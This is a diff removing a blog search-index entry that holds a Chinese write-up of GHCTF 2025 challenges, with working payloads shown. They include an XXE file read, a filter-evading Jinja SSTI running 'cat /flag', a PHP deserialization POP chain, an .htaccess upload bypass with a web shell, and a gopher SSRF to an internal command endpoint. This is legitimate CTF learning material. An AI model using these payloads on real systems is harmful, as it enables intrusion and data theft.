@@ -1,99 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>GHCTFwp</title>
-    <url>/2025/03/01/GHCTFwp/</url>
-    <content><![CDATA[<h1 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h1><p>战队名：先辈の队</p>
-<p>比赛排名：4</p>
-<p>联系方式:3011366557</p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="﹏"><a href="#﹏" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p>看源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import base64</span><br><span class="line">from lxml import etree</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 创建一个Flask应用实例</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 定义一个路由，当访问网站根目录时触发</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    # 打开当前Python文件并读取内容，然后返回给客户端</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"># 定义一个路由，当以POST方法访问/ghctf路径时触发</span><br><span class="line">@app.route(&#x27;/ghctf&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def parse():</span><br><span class="line">    # 从POST请求的表单中获取名为&#x27;xml&#x27;的字段</span><br><span class="line">    xml = request.form.get(&#x27;xml&#x27;)</span><br><span class="line">    # 打印获取到的xml内容</span><br><span class="line">    print(xml)</span><br><span class="line">    </span><br><span class="line">    # 如果没有提供&#x27;xml&#x27;字段，返回&quot;No System is Safe.&quot;</span><br><span class="line">    if xml is None:</span><br><span class="line">        return &quot;No System is Safe.&quot;</span><br><span class="line">    </span><br><span class="line">    # 创建一个lxml的XML解析器，允许加载DTD和解析实体</span><br><span class="line">    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)</span><br><span class="line">    </span><br><span class="line">    # 使用解析器解析xml字符串，获取XML的根元素</span><br><span class="line">    root = etree.fromstring(xml, parser)</span><br><span class="line">    </span><br><span class="line">    # 从XML中查找&#x27;name&#x27;标签，并获取其文本内容</span><br><span class="line">    name = root.find(&#x27;name&#x27;).text</span><br><span class="line">    </span><br><span class="line">    # 返回&#x27;name&#x27;标签的文本内容，如果没有找到则返回None</span><br><span class="line">    return name or None</span><br><span class="line"></span><br><span class="line"># 当这个脚本作为主程序运行时</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 在所有网络接口上运行应用，端口为8080</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
-
-<p>看到 <strong>parser &#x3D; etree.XMLParser(load_dtd&#x3D;True, resolve_entities&#x3D;True)</strong></p>
-<p>我们可以利用XXE攻击，即XML外部实体攻击。</p>
-<p>首先我们要抓包将其改为POST方法，并访问&#x2F;ghctf，页面上显示<code>No System is Safe.</code></p>
-<p>由于文件允许加载DTD和解析实体，我们xml字段中的内容可以写为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>其中<code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</code></p>
-<p>定义了一个名为xxe的实体并且其值是本地文件中flag文件的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在根目录的name标签中引用xxe。</p>
-<p>由于Content-Type<code>是</code>application&#x2F;x-www-form-urlencoded所以我们要把这个xml文本用url编码并复制到请求体的xml字段中再发送便能得到</p>
-<h3 id="flag："><a href="#flag：" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{7e4db57a-3ded-4ff4-972f-9873e2168114}</p>
-<h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p>查看附件app.py</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def view_file(filename):</span><br><span class="line">    try:</span><br><span class="line">        # 1. 过滤文件名</span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        if not safe_filename:</span><br><span class="line">            abort(400, description=&quot;无效文件名&quot;)</span><br><span class="line"></span><br><span class="line">        # 2. 构造完整路径</span><br><span class="line">        file_path = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], safe_filename)</span><br><span class="line"></span><br><span class="line">        # 3. 路径安全检查</span><br><span class="line">        if not is_safe_path(app.config[&#x27;UPLOAD_FOLDER&#x27;], file_path):</span><br><span class="line">            abort(403, description=&quot;禁止访问的路径&quot;)</span><br><span class="line"></span><br><span class="line">        # 4. 检查文件是否存在</span><br><span class="line">        if not os.path.isfile(file_path):</span><br><span class="line">            abort(404, description=&quot;文件不存在&quot;)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[1]</span><br><span class="line">        print(suffix)</span><br><span class="line">        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:</span><br><span class="line">            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#x27;image/jpeg&#x27;)</span><br><span class="line"></span><br><span class="line">        if contains_dangerous_keywords(file_path):</span><br><span class="line">            # 删除不安全的文件</span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400</span><br><span class="line"></span><br><span class="line">        with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="line">            file_data = f.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">        tmp_str = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html lang=&quot;zh&quot;&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">            &lt;title&gt;查看文件内容&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span><br><span class="line">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span><br><span class="line"></span><br><span class="line">            &lt;footer&gt;</span><br><span class="line">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span><br><span class="line">            &lt;/footer&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        return render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        app.logger.error(f&quot;文件查看失败: &#123;str(e)&#125;&quot;)</span><br><span class="line">        abort(500, description=&quot;文件查看失败:&#123;&#125; &quot;.format(str(e)))</span><br></pre></td></tr></table></figure>
-
-
-
-<p>发现<code>render_template_string(tmp_str)</code>这个函数能渲染html模板，模板中有我们上传文件中的内容，那么我们可以想到在我们上传的文件中写入一些危险代码随后再进行访问来显示flag。</p>
-<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>我们首先在文件中写入49发现访问文件后回显的是49，说明存在模板注入。</p>
-<p>接着我们就可以开始构造我们的攻击代码，基本的代码是这样的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__bases__[0].__subclasses__()[370](&quot;cat /flag&quot;, shell=True, stdout=-1).communicate() &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其中__subclasses__()[370]是类&lt;class ‘subprocess.Popen’&gt;</p>
-<p>但是由于过滤：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dangerous_keywords = [&#x27;_&#x27;, &#x27;os&#x27;, &#x27;subclasses&#x27;, &#x27;__builtins__&#x27;, &#x27;__globals__&#x27;,&#x27;flag&#x27;,]</span><br></pre></td></tr></table></figure>
-
-<p>我们需要把_换成16进制的\x5f,把subclasses拆分成两个字符串，那么便可以得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; []|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbases\x5f\x5f&quot;)|first|attr(&quot;\x5f\x5fsubcla&quot;+&quot;sses\x5f\x5f&quot;)()|list|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(370)|attr(&quot;\x5f\x5fcall\x5f\x5f&quot;)(&quot;cat /fl\x61g&quot;, shell=True, stdout=-1)|attr(&quot;communicate&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里|attr可以避免使用<code>.</code></p>
-<p><code>\x5f</code>绕过_,<code>fl\x61g</code>绕过flag，利用 <code>communicate()</code> 方法来执行命令并获取输出。上传并访问便能得到</p>
-<h3 id="flag：-1"><a href="#flag：-1" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{f9359d63-c8f5-4f3a-ae52-d164bbc158c6}</p>
-<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p>先使用联合查询判断显示位</p>
-<p><code>?id=0 union select 1,2,3,4,5</code></p>
-<p><img src="/../images/1740890606674.jpg" alt="1740890606674" loading="lazy"></p>
-<p>但是不知道数据库是哪种，于是我问ai各种数据库查询版本的代码最后查出是sqlite</p>
-<p><img src="/../images/1740890718774.jpg" alt="1740890718774" loading="lazy"></p>
-<p>随后直接查询flag</p>
-<p><img src="/../images/1740890779787.jpg" alt="1740890779787" loading="lazy"></p>
-<p>成功。</p>
-<h2 id="POppppppp"><a href="#POppppppp" class="headerlink" title="POppppppp"></a>POppppppp</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据源码发现这题是反序列化</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>我们主要是要利用mystery类中的原生类来读取flag文件，构造如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CherryBlossom &#123;</span><br><span class="line">    public $fruit1;</span><br><span class="line">    public $fruit2;</span><br><span class="line">    public function __construct($a) &#123;</span><br><span class="line">        $this-&gt;fruit1 = $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Samurai &#123;</span><br><span class="line">    public $fruit6;</span><br><span class="line">    public $fruit7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Warlord &#123;</span><br><span class="line">    public $fruit4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Philosopher &#123;</span><br><span class="line">    public $fruit10;</span><br><span class="line">    public $fruit11;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mystery &#123;</span><br><span class="line">    public $SplFileObject;</span><br><span class="line">&#125;</span><br><span class="line">$mystery = new Mystery();</span><br><span class="line">$mystery-&gt;SplFileObject= &quot;/flag44545615441084&quot;;</span><br><span class="line">$philosopher = new Philosopher();</span><br><span class="line">$philosopher-&gt;fruit10 = $mystery;</span><br><span class="line">$philosopher-&gt;fruit11 = 213; </span><br><span class="line">$warlord = new Warlord();</span><br><span class="line">$warlord-&gt;fruit4 = $philosopher;</span><br><span class="line">$samurai = new Samurai();</span><br><span class="line">$samurai-&gt;fruit6 = $warlord;</span><br><span class="line">$samurai-&gt;fruit7 = $mystery;</span><br><span class="line">$cherry = new CherryBlossom($samurai);</span><br><span class="line">echo urlencode(serialize($cherry));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里有两个难点，其中就是如何触发mystery中的get方法，我们可以想到利用Philosopher中的$this-&gt;fruit10-&gt;hey;，那么我们就需要一个字符串能两次md5后有666，因为这个是“&#x3D;&#x3D;”弱比较所以只要有包含666的字符串就行了，扔给ai生成脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;666&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000000</span>):</span><br><span class="line">    input_str = <span class="built_in">str</span>(i)</span><br><span class="line">    temp = hashlib.md5(input_str.encode()).hexdigest()</span><br><span class="line">    final = hashlib.md5(temp.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> final.startswith(target):  <span class="comment"># 检查前缀是否为 &quot;666&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: input=<span class="subst">&#123;input_str&#125;</span>, final_md5=<span class="subst">&#123;final&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p>运行得到结果“213”，我们将$fruit11赋值为213便能触发mystery的get方法，接下来便是寻找原生类的运用，搜索发现我们可以分别利用GlobIterator 类读取目录和SplFileObject类读取文件，我们只要将mystery设置一个新属性属性名为我们要用的类，值是我们的路径，便可以先通过GlobIterator 类找到flag的名字在用SplFileObject读取flag文件就行了。</p>
-<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{e92e6ae9-2fd8-49cf-b5d2-8072e4f0862b} </p>
-<h2 id="upupup"><a href="#upupup" class="headerlink" title="upupup"></a>upupup</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>根据提示不影响 .htaccess 语法的 mine绕过（getimagesize&amp;exif_imagetype绕过），我们可以在网上搜到文章<a href="https://blog.csdn.net/qq_45570082/article/details/108910162">php 文件上传.htaccess getimagesize和exif_imagetype绕过_getimagesize图片类型绕过-CSDN博客</a>，发现我们只要将.htaccess的内容设置为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">&lt;FilesMatch &quot;a.jpg&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上传，再写一个图片马上传，再用蚁剑连接找到flag就行了。</p>
-<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{09d16fca-9671-46e0-b912-3b5ef5621c53}</p>
-<h2 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h2><p>由提示，我们先访问&#x2F;app.py下载源码.查看发现</p>
-<p><img src="/../images/ad774e223c5624e0716c417260950908.png" alt="ad774e223c5624e0716c417260950908" loading="lazy"></p>
-<p><img src="/../images/56ee79c15351f94c4e78283e4a8bb371.png" alt="56ee79c15351f94c4e78283e4a8bb371" loading="lazy"></p>
-<p><img src="/../images/826d3e36771d059daf467bd565d31d51.png" alt="826d3e36771d059daf467bd565d31d51" loading="lazy"></p>
-<p>根据hint可以想到利用gopher的ssrf漏洞再利用manage读取文件，要利用Manage那么我们就需要绕过127.0.0.0的检测如果直接通过浏览器访问&#x2F;manage,会被拦截并返回forbidden，那么这时候我们就需要通过gopher访问本地服务再通过本地服务发送请求这样才不会拦截，那么我们就可以开始构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0:8000/_POST /Manage HTTP/1.1</span><br><span class="line">Host: 0:8000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">cmd=env</span><br></pre></td></tr></table></figure>
-
-<p>构造过程参考<a href="https://blog.csdn.net/shw_yzh/article/details/141601445">CTFHub-SSRF过关攻略_hackhub攻略-CSDN博客</a>，我们只需保留请求包需要的最基本的请求头，我们还需要编码两次，在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码 。</p>
-<p>由于127.0.0.1在黑名单中，所以我们需要改为0来绕过(参考<a href="https://blog.csdn.net/m0_73756016/article/details/138632803">ssrf学习2——内网ip绕过_ssrf 127.0.0.1绕过-CSDN博客</a>) 且端口是8000，根据提示，flag在环境变量里，那么我们就利用env打开环境变量便能获取flag</p>
-<p>payload：<a href="http://node2.anna.nssctf.cn:28591/Gopher?url=gopher://0:8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%25200%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A">http://node2.anna.nssctf.cn:28591/Gopher?url=gopher%3A%2F%2F0%3A8000%2F_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%25200%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A</a></p>
-<h3 id="flag：-2"><a href="#flag：-2" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{d334ec08-1ce4-4395-baa1-472f5e91273b}</p>
-<h1 id="MISC-mybrave"><a href="#MISC-mybrave" class="headerlink" title="MISC mybrave"></a>MISC mybrave</h1><p>下载附件得到加密文件</p>
-<p>发现里面只有一个文件，结合提示明文攻击，那么我们就可以利用png固定的文件头进行破解</p>
-<p><code>89504E470D0A1A0A0000000D49484452</code>写成二进制文件，然后利用bkcrack进行密钥破解，得到密钥再把文件解密得到<img src="/../images/3.png" alt="3" loading="lazy"></p>
-<p>用vscode二进制打开发现IEND之后还有数据，利用ai生成python代码将数据分离</p>
